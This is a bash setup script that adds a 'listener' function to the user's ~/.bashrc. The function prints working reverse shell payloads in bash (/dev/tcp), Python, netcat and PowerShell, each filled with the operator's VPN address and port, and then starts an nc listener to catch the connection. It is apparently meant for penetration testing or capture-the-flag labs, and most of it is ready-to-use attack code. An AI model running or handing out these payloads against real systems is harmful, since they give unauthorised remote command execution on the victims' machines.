#!/bin/bash
# Feature: Smart Reverse Shell Listener

cat >> ~/.bashrc << 'LISTENER'

# --- Feature: Reverse Shell Listener ---
listener() {
    local PORT=${1:-4444}
    local IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    
    if [ -z "$IP" ]; then
        echo -e "\033[0;31m[✗] VPN not connected!\033[0m"
        return 1
    fi
    
    echo -e "\033[1;33m[*] Listener on $IP:$PORT\033[0m"
    echo ""
    echo -e "\033[0;36m=== Reverse Shell Payloads ===\033[0m"
    echo ""
    echo -e "\033[1;37mBash:\033[0m"
    echo "  bash -i >& /dev/tcp/$IP/$PORT 0>&1"
    echo ""
    echo -e "\033[1;37mPython:\033[0m"
    echo "  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
    echo ""
    echo -e "\033[1;37mNetcat:\033[0m"
    echo "  nc -e /bin/bash $IP $PORT"
    echo ""
    echo -e "\033[1;37mPowerShell:\033[0m"
    echo "  powershell -nop -c \"\$client=New-Object System.Net.Sockets.TCPClient('$IP',$PORT);\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
    echo ""
    echo -e "\033[0;36m==============================\033[0m"
    echo ""
    
    rlwrap nc -nvlp "$PORT"
}

alias listen='listener'
alias shell='listener'
alias nnc='rlwrap nc -nvlp'

LISTENER

echo "[✓] Reverse shell listener added"